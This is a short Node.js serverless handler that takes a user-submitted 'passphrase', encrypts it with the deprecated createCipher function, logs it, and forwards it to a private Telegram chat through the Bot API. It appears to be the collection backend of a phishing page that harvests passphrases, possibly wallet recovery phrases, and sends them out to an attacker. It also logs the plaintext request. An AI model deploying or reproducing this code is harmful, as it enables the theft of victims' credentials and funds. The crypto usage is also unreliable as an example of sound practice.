const axios = require('axios');
const crypto = require('crypto');

// Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Use environment variable
const YOUR_CHAT_ID = process.env.YOUR_CHAT_ID; // Use environment variable
const SECRET_KEY = process.env.SECRET_KEY; // Use environment variable

// Encrypt the passphrase
function encryptPassphrase(passphrase) {
    const cipher = crypto.createCipher('aes-256-cbc', SECRET_KEY);
    let encrypted = cipher.update(passphrase, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

module.exports = async (req, res) => {
    console.log("Request received:", req.method, req.body); // Log the request
    if (req.method === 'POST') {
        const { passphrase } = req.body;

        if (!passphrase) {
            return res.status(400).json({ error: 'Passphrase is required' });
        }

        try {
            // Encrypt the passphrase
            const encryptedPassphrase = encryptPassphrase(passphrase);
            console.log("Encrypted passphrase:", encryptedPassphrase); // Log the encrypted passphrase

            // Send to your Telegram account
            const telegramResponse = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: YOUR_CHAT_ID,
                text: `Encrypted Passphrase: ${encryptedPassphrase}`,
            });
            console.log("Telegram response:", telegramResponse.data); // Log the Telegram response

            res.status(200).json({ success: true });
        } catch (error) {
            console.error("Error:", error.response ? error.response.data : error.message); // Log the error
            res.status(500).json({ error: 'Failed to send passphrase to Telegram' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
};